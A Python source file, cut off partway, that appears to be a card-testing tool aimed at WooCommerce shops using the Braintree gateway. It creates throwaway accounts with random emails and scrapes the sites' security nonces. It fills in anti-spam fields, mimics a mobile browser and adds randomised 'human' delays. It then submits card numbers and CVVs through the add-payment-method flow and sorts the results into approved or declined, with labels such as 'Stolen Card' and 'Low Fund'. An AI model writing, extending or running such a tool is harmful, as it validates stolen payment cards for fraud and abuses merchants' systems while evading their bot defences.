import asyncio
import base64
import json
import logging
import os
import random
import re
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from functools import wraps
from pathlib import Path
from typing import Tuple, Optional, Dict, List, Any

# Third-party imports
import aiohttp
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # python-dotenv is optional

try:
    from bs4 import BeautifulSoup
    HAS_BEAUTIFULSOUP = True
except ImportError:
    HAS_BEAUTIFULSOUP = False
    print("[WARNING] BeautifulSoup not available - fallback extraction disabled")

# ============================================================================
# CONFIGURATION MANAGEMENT
# ============================================================================

class SiteConfig:
    """Site-specific configuration"""
    def __init__(self, config_dict: Dict[str, Any], defaults: Dict[str, Any]):
        self.enabled = config_dict.get('enabled', True)
        self.retry_strategy = config_dict.get('retry_strategy', defaults.get('retry_strategy', 'normal'))
        self.max_retries = config_dict.get('max_retries', defaults.get('max_retries', 3))
        self.timeout = config_dict.get('timeout', defaults.get('timeout', 30))
        self.requires_billing = config_dict.get('requires_billing', defaults.get('requires_billing', True))
        self.payment_gateway = config_dict.get('payment_gateway', defaults.get('payment_gateway', 'braintree'))
        self.custom_headers = config_dict.get('custom_headers', {})
        
        delays = config_dict.get('delays', defaults.get('delays', {}))
        self.delay_between_requests = delays.get('between_requests', 2.0)
        self.delay_after_registration = delays.get('after_registration', 3.0)

class ConfigurationManager:
    """Manages site configurations from config.json"""
    
    def __init__(self, config_path: Optional[str] = None):
        """
        Initialize configuration manager.
        
        Args:
            config_path: Path to config.json file (default: ./config.json)
        """
        if config_path is None:
            # Try to find config.json in the same directory as this script
            script_dir = Path(__file__).parent
            config_path = script_dir / 'config.json'
        
        self.config_path = Path(config_path)
        self.sites: Dict[str, SiteConfig] = {}
        self.defaults: Dict[str, Any] = {}
        self.retry_strategies: Dict[str, Dict[str, Any]] = {}
        
        self._load_config()
    
    def _load_config(self):
        """Load configuration from JSON file"""
        try:
            if not self.config_path.exists():
                print(f"[WARNING] Config file not found: {self.config_path}, using defaults")
                self._load_defaults()
                return
            
            with open(self.config_path, 'r', encoding='utf-8') as f:
                config_data = json.load(f)
            
            self.defaults = config_data.get('defaults', {})
            self.retry_strategies = config_data.get('retry_strategies', {})
            
            # Load site configurations
            sites_config = config_data.get('sites', {})
            for site_url, site_data in sites_config.items():
                self.sites[site_url] = SiteConfig(site_data, self.defaults)
            
            print(f"[INFO] Loaded configuration for {len(self.sites)} sites from {self.config_path}")
            
        except json.JSONDecodeError as e:
            print(f"[ERROR] Invalid JSON in config file: {e}")
            self._load_defaults()
        except Exception as e:
            print(f"[ERROR] Failed to load config: {e}")
            self._load_defaults()
    
    def _load_defaults(self):
        """Load default configuration"""
        self.defaults = {
            'retry_strategy': 'normal',
            'max_retries': 3,
            'timeout': 30,
            'requires_billing': True,
            'payment_gateway': 'braintree',
            'delays': {
                'between_requests': 2.0,
                'after_registration': 3.0
            }
        }
        self.retry_strategies = {
            'normal': {
                'max_retries': 3,
                'initial_delay': 1.0,
                'backoff_multiplier': 2.0
            }
        }
    
    def get_site_config(self, site_url: str) -> SiteConfig:
        """
        Get configuration for a specific site.
        
        Args:
            site_url: Site URL
            
        Returns:
            SiteConfig object (creates default if not found)
        """
        if site_url not in self.sites:
            # Create default config for unknown sites
            return SiteConfig({}, self.defaults)
        return self.sites[site_url]
    
    def get_retry_strategy(self, strategy_name: str) -> Dict[str, Any]:
        """
        Get retry strategy configuration.
        
        Args:
            strategy_name: Strategy name (aggressive, normal, conservative)
            
        Returns:
            Dictionary with retry parameters
        """
        return self.retry_strategies.get(strategy_name, {
            'max_retries': 3,
            'initial_delay': 1.0,
            'backoff_multiplier': 2.0
        })
    
    def get_enabled_sites(self) -> List[str]:
        """Get list of enabled site URLs"""
        return [url for url, config in self.sites.items() if config.enabled]

# Global configuration manager instance
_config_manager: Optional[ConfigurationManager] = None

def get_config_manager() -> ConfigurationManager:
    """Get or create global configuration manager"""
    global _config_manager
    if _config_manager is None:
        _config_manager = ConfigurationManager()
    return _config_manager

# ============================================================================
# CIRCUIT BREAKER PATTERN
# ============================================================================

class CircuitBreaker:
    """Circuit breaker to handle failing sites gracefully"""
    
    def __init__(self, failure_threshold: int = 5, recovery_timeout: float = 300.0):
        """
        Initialize circuit breaker.
        
        Args:
            failure_threshold: Number of failures before opening circuit
            recovery_timeout: Seconds to wait before attempting recovery
        """
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self.failures: Dict[str, int] = {}
        self.opened_at: Dict[str, float] = {}
        self.state: Dict[str, str] = {}  # 'closed', 'open', 'half-open'
    
    def record_success(self, site: str):
        """Record successful operation for a site"""
        self.failures[site] = 0
        self.state[site] = 'closed'
        if site in self.opened_at:
            del self.opened_at[site]
    
    def record_failure(self, site: str):
        """Record failed operation for a site"""
        self.failures[site] = self.failures.get(site, 0) + 1
        
        if self.failures[site] >= self.failure_threshold:
            self.state[site] = 'open'
            self.opened_at[site] = time.time()
            logger.warning(f"Circuit breaker OPENED for {site} after {self.failures[site]} failures")
    
    def can_attempt(self, site: str) -> bool:
        """Check if we can attempt to access a site"""
        current_state = self.state.get(site, 'closed')
        
        if current_state == 'closed':
            return True
        
        if current_state == 'open':
            # Check if recovery timeout has passed
            opened_at = self.opened_at.get(site, 0)
            if time.time() - opened_at > self.recovery_timeout:
                self.state[site] = 'half-open'
                logger.info(f"Circuit breaker entering HALF-OPEN state for {site}")
                return True
            return False
        
        # half-open state
        return True
    
    def get_state(self, site: str) -> str:
        """Get current state for a site"""
        return self.state.get(site, 'closed')

# Global circuit breaker instance
_circuit_breaker = CircuitBreaker()

def get_circuit_breaker() -> CircuitBreaker:
    """Get global circuit breaker instance"""
    return _circuit_breaker

# ============================================================================
# LOGGING CONFIGURATION
# ============================================================================

def setup_logging(log_level: str = "INFO", log_file: str = "braintree_processor.log") -> logging.Logger:
    """
    Configure and setup comprehensive logging system.
    
    Args:
        log_level: Logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL)
        log_file: Path to log file
        
    Returns:
        Configured logger instance
    """
    log_format = "%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s"
    date_format = "%Y-%m-%d %H:%M:%S"
    
    # Create logs directory if it doesn't exist
    log_path = Path(log_file)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format=log_format,
        datefmt=date_format,
        handlers=[
            logging.FileHandler(log_file, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
    
    logger = logging.getLogger(__name__)
    logger.info(f"Logging initialized at level {log_level}")
    return logger

logger = setup_logging()

# ============================================================================
# CUSTOM EXCEPTIONS
# ============================================================================

class BraintreeError(Exception):
    """Base exception for Braintree operations"""
    pass

class AuthenticationError(BraintreeError):
    """Raised when authentication/login fails"""
    pass

class TokenError(BraintreeError):
    """Raised when token extraction/generation fails"""
    pass

class ValidationError(BraintreeError):
    """Raised when input validation fails"""
    pass

class NetworkError(BraintreeError):
    """Raised when network requests fail"""
    pass

# ============================================================================
# ENUMS
# ============================================================================

class PaymentStatus(str, Enum):
    """Payment processing status"""
    APPROVED = "Approved"
    DECLINED = "Declined"
    ERROR = "Error"
    PENDING = "Pending"

# ============================================================================
# DATACLASSES
# ============================================================================

@dataclass
class CardDetails:
    """Credit card details with validation"""
    number: str
    expiry_month: str
    expiry_year: str
    cvv: str
    
    def __post_init__(self):
        """Validate card details after initialization"""
        self.number = self.number.strip().replace(" ", "").replace("-", "")
        self.expiry_month = self.expiry_month.strip()
        self.expiry_year = self.expiry_year.strip()
        self.cvv = self.cvv.strip()
        
        if not self.validate():
            raise ValidationError("Invalid card details")
    
    def validate(self) -> bool:
        """Validate card number using Luhn algorithm and other checks"""
        # Luhn algorithm validation
        if not self._luhn_check(self.number):
            logger.error("Card number failed Luhn validation")
            return False
        
        # Length validation
        if len(self.number) < 13 or len(self.number) > 19:
            logger.error(f"Invalid card number length: {len(self.number)}")
            return False
        
        # CVV validation
        if not (3 <= len(self.cvv) <= 4):
            logger.error(f"Invalid CVV length: {len(self.cvv)}")
            return False
        
        if not self.cvv.isdigit():
            logger.error("CVV must be numeric")
            return False
        
        # Expiry validation
        try:
            month = int(self.expiry_month)
            year = int(self.expiry_year) if len(self.expiry_year) == 4 else int(f"20{self.expiry_year}")
            
            if not (1 <= month <= 12):
                logger.error(f"Invalid expiry month: {month}")
                return False
            
            # Get current date once to avoid potential issues with month changing between calls
            now = time.localtime()
            current_year = now.tm_year
            current_month = now.tm_mon
            
            if year < current_year or (year == current_year and month < current_month):
                logger.warning("Card expiry date is in the past")
                return False
        except ValueError:
            logger.error("Invalid expiry date format")
            return False
        
        return True
    
    @staticmethod
    def _luhn_check(card_number: str) -> bool:
        """Luhn algorithm for card number validation"""
        def digits_of(n):
            return [int(d) for d in str(n)]
        
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0
    
    def masked_number(self) -> str:
        """Return masked card number for logging"""
        if len(self.number) < 8:
            return "****"
        return f"{self.number[:6]}******{self.number[-4:]}"

@dataclass
class APBCTFields:
    """Anti-spam fields"""
    apbct_visible: str = ""
    ct_no_cookie: str = ""
    
    def to_params(self) -> Tuple[str, str]:
        """Convert to URL parameters"""
        apbct_param = f"apbct_visible_fields={self.apbct_visible}" if self.apbct_visible else ""
        ct_param = f"ct_no_cookie_hidden_field={self.ct_no_cookie}" if self.ct_no_cookie else ""
        return apbct_param, ct_param

@dataclass
class PaymentResult:
    """Payment processing result"""
    status: PaymentStatus
    message: str
    card_bin: Optional[str] = None
    card_brand: Optional[str] = None
    timestamp: float = field(default_factory=time.time)
    
    def __str__(self) -> str:
        return f"{self.status.value}: {self.message}"

@dataclass
class AccountCredentials:
    """Account credentials with masking"""
    email: str
    password: str
    
    def masked_email(self) -> str:
        """Return masked email for logging"""
        if "@" not in self.email:
            return "****@****"
        name, domain = self.email.split("@", 1)
        if len(name) <= 2:
            return f"**@{domain}"
        return f"{name[:2]}***@{domain}"

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    """Configuration management"""
    
    # Headers configuration - Mobile Android for better site acceptance
    DEFAULT_HEADERS = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    BRAINTREE_HEADERS = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "braintree-version": "2018-05-10",
        "accept": "*/*",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }
    
    # Retry configuration
    MAX_RETRIES = 3
    RETRY_DELAY = 1.0
    RETRY_BACKOFF = 2.0
    
    # Timeout configuration
    REQUEST_TIMEOUT = 30
    TOTAL_TIMEOUT = 90
    
    # Connection pool configuration
    CONNECTOR_LIMIT = 100
    CONNECTOR_LIMIT_PER_HOST = 20
    
    # Default password (should be set via environment variable)
    DEFAULT_PASSWORD = os.getenv("BRAINTREE_DEFAULT_PASSWORD", "TestPass123!@#")
    
    # Success messages
SUCCESS_MESSAGES = {
    'nice! new payment method added',
    'payment method successfully added',
    'duplicate card exists in the vault',
    'payment method added'
}

    # Decline messages mapping
DECLINE_MESSAGES = {
    'card number is incorrect': 'Invalid Card Number',
    'invalid card': 'Invalid Card',
    'card declined': 'Card Declined',
    'invalid cvv': 'Invalid CVV',
    'expired card': 'Card Expired',
    'do not honor': 'Do Not Honor',
    'stolen card': 'Stolen Card',
    'lost card': 'Lost Card',
    'pickup card': 'Pickup Card',
    'transaction not allowed': 'Transaction Not Allowed',
    'security code is incorrect': 'Invalid CVV',
    'status code risk_threshold: gateway rejected: risk_threshold': 'Gateway Rejected: risk_threshold',
    '3d secure': '3D Secure Required',
    'authentication required': '3D Secure Required',
    'verification required': '3D Secure Required',
    'insufficient funds': 'Low Fund',
    'processor declined': 'Processor Declined'
}

# ============================================================================
# REGEX PATTERNS
# ============================================================================

REGEX_PATTERNS = {
    # Registration & Login nonces - multiple patterns
    'register_nonce': re.compile(r'(?:name="woocommerce-register-nonce"|id="woocommerce-register-nonce")(?:\s+type="hidden")?\s+value="([^"]+)"'),
    'login_nonce': re.compile(r'(?:name="woocommerce-login-nonce"|id="woocommerce-login-nonce")(?:\s+type="hidden")?\s+value="([^"]+)"'),
    
    # Billing nonce - multiple patterns
    'billing_nonce': re.compile(r'(?:name="woocommerce-edit-address-nonce"|id="woocommerce-edit-address-nonce")(?:\s+type="hidden")?\s+value="([^"]+)"'),
    
    # Client token nonce - multiple patterns
    'client_token_nonce': re.compile(r'"client_token_nonce":"([^"]+)"'),
    'client_token_nonce_alt': re.compile(r'(?:name="wc-braintree-credit-card-get-client-token-nonce"|id="wc-braintree-credit-card-get-client-token-nonce")(?:\s+type="hidden")?\s+value="([^"]+)"'),
    
    # Payment method nonce - multiple patterns
    'payment_method_nonce': re.compile(r'(?:name="woocommerce-add-payment-method-nonce"|id="woocommerce-add-payment-method-nonce")(?:\s+type="hidden")?\s+value="([^"]+)"'),
    
    # Braintree tokens
    'data_token': re.compile(r'"data":"([^"]+)"'),
    'auth_fingerprint': re.compile(r'"authorizationFingerprint":"([^"]+)"'),
    'token': re.compile(r'"token":"([^"]+)"'),
    'brand_code': re.compile(r'"brandCode":"([^"]+)"'),
    
    # Embedded client token - multiple patterns
    'braintree_client_token': re.compile(r'var wc_braintree_client_token = \[?"?([^"\]]+)"?\]?'),
    'braintree_client_token_alt': re.compile(r'wc_braintree_client_token\s*=\s*\[?"?([^"\]]+)"?\]?'),
    
    # Response messages
    'message': re.compile(r'"message":\s*"([^"]+)"'),
    'status_code': re.compile(r'Status code\s*([^<]+)</li>'),
    'error_message': re.compile(r'<li>\s*([^<]+)\s*</li>'),
    
    # Anti-spam fields
    'apbct_visible': re.compile(r'name="apbct_visible_fields"\s+value="([^"]+)"'),
    'ct_no_cookie': re.compile(r'name="ct_no_cookie_hidden_field"\s+value="([^"]+)"'),
    
    # Config
    'braintree_config': re.compile(r'var wc_braintree_credit_card_payment_gateway_settings = ({.+?});', re.DOTALL)
}

# Additional fallback patterns for enhanced extraction
FALLBACK_PATTERNS = {
    'register_nonce': [
        re.compile(r'name=["\']woocommerce-register-nonce["\']\s+value=["\']([^"\']+)["\']'),
        re.compile(r'value=["\']([^"\']+)["\']\s+name=["\']woocommerce-register-nonce["\']'),
        re.compile(r'<input[^>]*woocommerce-register-nonce[^>]*value=["\']([^"\']+)["\']'),
        re.compile(r'register-nonce["\']?\s*:\s*["\']([^"\']+)["\']'),
    ],
    'login_nonce': [
        re.compile(r'name=["\']woocommerce-login-nonce["\']\s+value=["\']([^"\']+)["\']'),
        re.compile(r'value=["\']([^"\']+)["\']\s+name=["\']woocommerce-login-nonce["\']'),
        re.compile(r'<input[^>]*woocommerce-login-nonce[^>]*value=["\']([^"\']+)["\']'),
        re.compile(r'login-nonce["\']?\s*:\s*["\']([^"\']+)["\']'),
    ],
    'billing_nonce': [
        re.compile(r'name=["\']woocommerce-edit-address-nonce["\']\s+value=["\']([^"\']+)["\']'),
        re.compile(r'value=["\']([^"\']+)["\']\s+name=["\']woocommerce-edit-address-nonce["\']'),
        re.compile(r'<input[^>]*edit-address-nonce[^>]*value=["\']([^"\']+)["\']'),
        re.compile(r'edit-address-nonce["\']?\s*:\s*["\']([^"\']+)["\']'),
    ],
    'payment_method_nonce': [
        re.compile(r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']'),
        re.compile(r'value=["\']([^"\']+)["\']\s+name=["\']woocommerce-add-payment-method-nonce["\']'),
        re.compile(r'<input[^>]*add-payment-method-nonce[^>]*value=["\']([^"\']+)["\']'),
        re.compile(r'add-payment-method-nonce["\']?\s*:\s*["\']([^"\']+)["\']'),
    ],
    'client_token_nonce': [
        re.compile(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)["\']'),
        re.compile(r'name=["\']wc-braintree-credit-card-get-client-token-nonce["\']\s+value=["\']([^"\']+)["\']'),
        re.compile(r'get-client-token-nonce["\']?\s*:\s*["\']([^"\']+)["\']'),
    ],
    'braintree_client_token': [
        re.compile(r'wc_braintree_client_token\s*=\s*["\']([^"\']+)["\']'),
        re.compile(r'client_token["\']?\s*:\s*["\']([^"\']+)["\']'),
        re.compile(r'braintree.*token["\']?\s*:\s*["\']([A-Za-z0-9+/=]{20,})["\']', re.IGNORECASE),
    ]
}

# ============================================================================
# RETRY DECORATOR
# ============================================================================

def retry_on_failure(max_retries: int = Config.MAX_RETRIES, 
                     delay: float = Config.RETRY_DELAY,
                     backoff: float = Config.RETRY_BACKOFF,
                     exceptions: tuple = (NetworkError, aiohttp.ClientError, asyncio.TimeoutError)):
    """
    Decorator for retrying async functions with exponential backoff.
    
    Args:
        max_retries: Maximum number of retry attempts
        delay: Initial delay between retries in seconds
        backoff: Backoff multiplier
        exceptions: Tuple of exceptions to catch and retry on
    """
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            current_delay = delay
            last_exception = None
            
            for attempt in range(max_retries + 1):
                try:
                    return await func(*args, **kwargs)
                except exceptions as e:
                    last_exception = e
                    if attempt < max_retries:
                        logger.warning(
                            f"{func.__name__} failed (attempt {attempt + 1}/{max_retries + 1}): {str(e)}. "
                            f"Retrying in {current_delay:.2f}s..."
                        )
                        await asyncio.sleep(current_delay)
                        current_delay *= backoff
                    else:
                        logger.error(f"{func.__name__} failed after {max_retries + 1} attempts")
                        raise NetworkError(f"Max retries exceeded: {str(e)}") from last_exception
                except Exception as e:
                    logger.error(f"{func.__name__} raised unexpected exception: {type(e).__name__}: {str(e)}")
                    raise
            
            raise NetworkError(f"Unexpected retry failure") from last_exception
        return wrapper
    return decorator

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def get_headers(url: str, referer: Optional[str] = None, is_post: bool = False) -> Dict[str, str]:
    """
    Generate HTTP headers for requests with enhanced browser simulation.
    
    Args:
        url: Target URL
        referer: Referer URL (optional)
        is_post: Whether this is a POST request (adjusts headers accordingly)
        
    Returns:
        Dictionary of headers
    """
    headers = Config.DEFAULT_HEADERS.copy()
    
    # Add authority header
    headers['authority'] = url
    
    # Set referer
    if referer:
        headers['referer'] = referer
        headers['sec-fetch-site'] = 'same-origin'
    else:
        headers['sec-fetch-site'] = 'none'
    
    # Adjust headers for POST requests
    if is_post:
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['origin'] = f'https://{url}'
        headers['sec-fetch-mode'] = 'navigate'
        headers['sec-fetch-dest'] = 'document'
    else:
        headers['sec-fetch-mode'] = 'navigate'
        headers['sec-fetch-dest'] = 'document'
    
    return headers

def extract_with_regex(pattern_name: str, text: str) -> Optional[str]:
    """
    Extract value using precompiled regex pattern with enhanced fallback support.
    
    Args:
        pattern_name: Name of the regex pattern
        text: Text to search in
        
    Returns:
        Extracted value or None
    """
    # Try primary pattern first
    pattern = REGEX_PATTERNS.get(pattern_name)
    if pattern:
        match = pattern.search(text)
        if match:
            return match.group(1)
    else:
        logger.warning(f"Unknown regex pattern: {pattern_name}")
    
    # Try fallback patterns if available
    fallback_patterns = FALLBACK_PATTERNS.get(pattern_name, [])
    for i, fallback in enumerate(fallback_patterns):
        match = fallback.search(text)
        if match:
            logger.debug(f"Extracted {pattern_name} using fallback pattern #{i+1}")
            return match.group(1)
    
    return None

def extract_nonce_with_beautifulsoup(html_text: str, nonce_name: str) -> Optional[str]:
    """
    Fallback nonce extraction using BeautifulSoup for DOM parsing.
    
    Args:
        html_text: HTML content
        nonce_name: Name attribute to search for
        
    Returns:
        Nonce value or None
    """
    if not HAS_BEAUTIFULSOUP:
        return None
    
    try:
        soup = BeautifulSoup(html_text, 'html.parser')
        
        # Try finding by name attribute
        input_elem = soup.find('input', {'name': nonce_name})
        if input_elem and input_elem.get('value'):
            logger.debug(f"Extracted {nonce_name} using BeautifulSoup (by name)")
            return input_elem.get('value')
        
        # Try finding by id attribute
        input_elem = soup.find('input', {'id': nonce_name})
        if input_elem and input_elem.get('value'):
            logger.debug(f"Extracted {nonce_name} using BeautifulSoup (by id)")
            return input_elem.get('value')
        
    except Exception as e:
        logger.debug(f"BeautifulSoup extraction failed: {str(e)}")
    
    return None

def extract_with_regex_enhanced(pattern_name: str, text: str, nonce_field_name: Optional[str] = None) -> Optional[str]:
    """
    Enhanced extraction with regex + BeautifulSoup fallback.
    
    Args:
        pattern_name: Name of the regex pattern
        text: Text to search in
        nonce_field_name: Optional field name for BeautifulSoup fallback
        
    Returns:
        Extracted value or None
    """
    # Try regex first
    result = extract_with_regex(pattern_name, text)
    if result:
        return result
    
    # Try BeautifulSoup as last resort if field name provided
    if nonce_field_name:
        result = extract_nonce_with_beautifulsoup(text, nonce_field_name)
        if result:
            return result
    
    return None

def analyze_response_text(text: str) -> PaymentResult:
    """
    Analyze response text and determine payment status.
    
    Args:
        text: Response text to analyze
        
    Returns:
        PaymentResult object
    """
    text_lower = text.lower()
    
    # Check for success messages
    for success_msg in Config.SUCCESS_MESSAGES:
        if success_msg in text_lower:
            if 'duplicate' in success_msg:
                logger.info("Payment approved (duplicate card)")
                return PaymentResult(PaymentStatus.APPROVED, "1000: Duplicate Card (Approved)")
            logger.info("Payment approved")
            return PaymentResult(PaymentStatus.APPROVED, "1000: Approved")
    
    # Check for decline messages
    for decline_text, decline_msg in Config.DECLINE_MESSAGES.items():
        if decline_text in text_lower:
            logger.warning(f"Payment declined: {decline_msg}")
            return PaymentResult(PaymentStatus.DECLINED, decline_msg)
    
    # Try to extract message from response
    message_match = extract_with_regex('message', text)
    if message_match:
        logger.warning(f"Payment declined: {message_match}")
        return PaymentResult(PaymentStatus.DECLINED, message_match)
    
    # Try to extract status code
    status_match = extract_with_regex('status_code', text)
    if status_match:
        logger.warning(f"Payment declined: {status_match}")
        return PaymentResult(PaymentStatus.DECLINED, status_match)
    
    logger.error("Unknown response format")
    return PaymentResult(PaymentStatus.ERROR, "Unknown response")

def extract_apbct_fields(html_text: str) -> APBCTFields:
    """
    Extract anti-spam fields from HTML.
    
    Args:
        html_text: HTML content
        
    Returns:
        APBCTFields object
    """
    apbct_visible = extract_with_regex('apbct_visible', html_text)
    ct_no_cookie = extract_with_regex('ct_no_cookie', html_text)
    
    return APBCTFields(
        apbct_visible=apbct_visible or "",
        ct_no_cookie=ct_no_cookie or ""
    )

# ============================================================================
# CORE FUNCTIONS
# ============================================================================

async def fetch_page(session: aiohttp.ClientSession, url: str, headers: Dict[str, str]) -> str:
    """
    Fetch a page with retry logic.
    
    Args:
        session: aiohttp client session
        url: URL to fetch
        headers: HTTP headers
        
    Returns:
        Response text
        
    Raises:
        NetworkError: If request fails after retries
        AuthenticationError: If access is forbidden (403) or unauthorized (401)
    """
    try:
        async with session.get(url, headers=headers) as response:
            status = response.status
            
            # Don't retry on permanent errors (403, 401)
            if status == 403:
                error_msg = f"Access Forbidden (403) for {url} - Site may be blocking access"
                logger.error(error_msg)
                raise AuthenticationError(error_msg)
            elif status == 401:
                error_msg = f"Unauthorized (401) for {url} - Authentication required"
                logger.error(error_msg)
                raise AuthenticationError(error_msg)
            elif status == 404:
                error_msg = f"Page Not Found (404) for {url}"
                logger.error(error_msg)
                raise NetworkError(error_msg)
            elif status != 200:
                error_msg = f"HTTP {status} for {url}"
                logger.error(error_msg)
                raise NetworkError(error_msg)
            
            return await response.text()
    except (AuthenticationError, NetworkError):
        raise
    except aiohttp.ClientError as e:
        logger.error(f"Network error fetching {url}: {str(e)}")
        raise NetworkError(f"Failed to fetch {url}: {str(e)}") from e

@retry_on_failure()
async def fetch_page_with_retry(session: aiohttp.ClientSession, url: str, headers: Dict[str, str]) -> str:
    """
    Fetch a page with retry logic (for retryable errors only).
    
    Args:
        session: aiohttp client session
        url: URL to fetch
        headers: HTTP headers
        
    Returns:
        Response text
        
    Raises:
        NetworkError: If request fails after retries
        AuthenticationError: If access is forbidden (non-retryable)
    """
    return await fetch_page(session, url, headers)

async def post_data(session: aiohttp.ClientSession, url: str, 
                   data: str, headers: Dict[str, str]) -> str:
    """
    POST data with retry logic.
    
    Args:
        session: aiohttp client session
        url: URL to POST to
        data: POST data
        headers: HTTP headers
        
    Returns:
        Response text
        
    Raises:
        NetworkError: If request fails after retries
        AuthenticationError: If access is forbidden (403) or unauthorized (401)
    """
    try:
        async with session.post(url, headers=headers, data=data) as response:
            status = response.status
            
            # Don't retry on permanent errors (403, 401)
            if status == 403:
                error_msg = f"Access Forbidden (403) for POST {url}"
                logger.error(error_msg)
                raise AuthenticationError(error_msg)
            elif status == 401:
                error_msg = f"Unauthorized (401) for POST {url}"
                logger.error(error_msg)
                raise AuthenticationError(error_msg)
            elif status == 404:
                error_msg = f"Page Not Found (404) for POST {url}"
                logger.error(error_msg)
                raise NetworkError(error_msg)
            elif status != 200:
                error_msg = f"HTTP {status} for POST {url}"
                logger.error(error_msg)
                raise NetworkError(error_msg)
            
            return await response.text()
    except (AuthenticationError, NetworkError):
        raise
    except aiohttp.ClientError as e:
        logger.error(f"Network error posting to {url}: {str(e)}")
        raise NetworkError(f"Failed to POST to {url}: {str(e)}") from e

@retry_on_failure()
async def post_data_with_retry(session: aiohttp.ClientSession, url: str, 
                               data: str, headers: Dict[str, str]) -> str:
    """
    POST data with retry logic (for retryable errors only).
    
    Args:
        session: aiohttp client session
        url: URL to POST to
        data: POST data
        headers: HTTP headers
        
    Returns:
        Response text
        
    Raises:
        NetworkError: If request fails after retries
        AuthenticationError: If access is forbidden (non-retryable)
    """
    return await post_data(session, url, data, headers)

async def generate_account_credentials() -> AccountCredentials:
    """
    Generate random account credentials.
    
    Returns:
        AccountCredentials object
    """
    rand_num = random.randint(10000, 99999)
    email = f"user{rand_num}@gmail.com"
    password = Config.DEFAULT_PASSWORD
    
    credentials = AccountCredentials(email=email, password=password)
    logger.info(f"Generated credentials: {credentials.masked_email()}")
    return credentials

async def get_register_nonce(session: aiohttp.ClientSession, url: str) -> Tuple[Optional[str], APBCTFields]:
    """
    Get registration nonce from account page with improved site acceptance.
    
    Args:
        session: aiohttp client session
        url: Site URL
        
    Returns:
        Tuple of (nonce, APBCTFields)
    """
    # First, try accessing homepage to establish session
    try:
        headers = get_headers(url)
        homepage_url = f'https://{url}/'
        logger.debug(f"Establishing session with homepage: {homepage_url}")
        async with session.get(homepage_url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                await resp.text()  # Consume response
                # Small delay to simulate human behavior
                await asyncio.sleep(random.uniform(1.0, 2.5))
    except Exception as e:
        logger.debug(f"Homepage access failed (non-critical): {str(e)}")
    
    # Now access my-account page
    headers = get_headers(url)
    page_url = f'https://{url}/my-account/'
    
    logger.debug(f"Fetching registration page: {page_url}")
    text = await fetch_page_with_retry(session, page_url, headers)
    
    # Small delay after page fetch
    await asyncio.sleep(random.uniform(0.5, 1.5))
    
    # Try enhanced extraction with BeautifulSoup fallback
    rnonce = extract_with_regex_enhanced('register_nonce', text, 'woocommerce-register-nonce')
    apbct_fields = extract_apbct_fields(text)
    
    if not rnonce:
        logger.warning("Registration nonce not found with all methods")
        # Check if registration might be disabled
        if 'registration' in text.lower() and 'disabled' in text.lower():
            logger.warning("Registration appears to be disabled on this site")
    else:
        logger.debug("Registration nonce found")
    
    return rnonce, apbct_fields

async def perform_registration(session: aiohttp.ClientSession, url: str, 
                               credentials: AccountCredentials, 
                               rnonce: str, apbct_fields: APBCTFields) -> bool:
    """
    Perform account registration.
    
    Args:
        session: aiohttp client session
        url: Site URL
        credentials: Account credentials
        rnonce: Registration nonce
        apbct_fields: Anti-spam fields
        
    Returns:
        True if registration successful
    """
    data_parts = [
        f"email={credentials.email}",
        f"woocommerce-register-nonce={rnonce}",
        f"_wp_http_referer=%2Fmy-account%2F",
        f"register=Register"
    ]
    
    apbct_param, ct_param = apbct_fields.to_params()
    if apbct_param:
        data_parts.append(apbct_param)
    if ct_param:
        data_parts.append(ct_param)
    
    post_data_str = "&".join(data_parts)
    
    headers = get_headers(url, f'https://{url}/my-account/', is_post=True)
    headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
    headers['content-length'] = str(len(post_data_str.encode('utf-8')))
    
    page_url = f'https://{url}/my-account/'
    
    # Add delay before POST to simulate human typing
    await asyncio.sleep(random.uniform(2.0, 4.0))
    
    logger.debug(f"Submitting registration for {credentials.masked_email()}")
    resp_text = await post_data_with_retry(session, page_url, post_data_str, headers)
    
    # Wait a bit after POST to simulate page load
    await asyncio.sleep(random.uniform(1.0, 2.0))
    
    # Enhanced success detection
    success_indicators = [
        'dashboard', 'logout', 'payment-methods', 'my account', 
        'account dashboard', 'welcome', 'hello', 'my orders',
        'edit account', 'addresses', 'account details'
    ]
    
    # Check for error messages first
    error_indicators = [
        'error', 'invalid', 'failed', 'try again', 'incorrect',
        'already exists', 'already registered', 'email already',
        'registration disabled', 'registration closed'
    ]
    
